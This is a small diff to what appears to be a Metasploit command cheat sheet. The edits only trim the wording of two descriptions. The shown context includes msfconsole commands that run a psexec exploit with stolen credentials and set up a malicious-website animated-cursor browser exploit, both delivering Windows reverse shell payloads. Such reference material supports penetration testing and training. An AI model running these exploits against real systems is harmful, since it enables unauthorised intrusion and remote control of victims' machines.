@@ -37,7 +37,7 @@ show evasion
 Force an active module to the background.
 exploit -j
 
-This example makes use of a previously acquired set of credentials to exploit and gain a reverse shell on the target system. 
+Use a previously acquired set of credentials to exploit and gain a reverse shell on the target system. 
 use exploit/windows/smb/psexec
 set RHOST 10.0.0.20
 set PAYLOAD windows/shell/reverse_tcp
@@ -56,7 +56,7 @@ sessions -l
 Interact with session 2.
 sessions -i 2
 
-Example setup to exploit the animated cursor vulnerability. The exploit does not fire until a victim browses to our malicious website. 
+Animated cursor vulnerability. The exploit does not fire until a victim browses to our malicious website. 
 use exploit/windows/browser/ani_loadimage_chunksize
 set URIPATH /
 set PAYLOAD windows/shell/reverse_tcp
